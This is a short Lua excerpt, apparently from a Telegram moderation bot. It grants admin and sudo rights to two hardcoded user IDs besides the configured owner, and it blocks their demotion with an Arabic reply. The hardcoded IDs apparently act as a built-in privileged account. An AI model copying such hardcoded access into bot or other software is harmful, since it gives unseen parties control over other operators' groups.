...
local Adminn = false
if msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 811166089 or msg.sender_user_id_ == 1669091036 then 
Adminn = true
...
result = false
if msg.sender_user_id_ == 811166089 or msg.sender_user_id_ == 1669091036 then 
SudoBase = true
...
if UserID == 811166089 or UserID ==1669091036 then return sendMsg(ChatID,MsgID,"❍ مايمديك تنزل Ace🎖 ! ") end
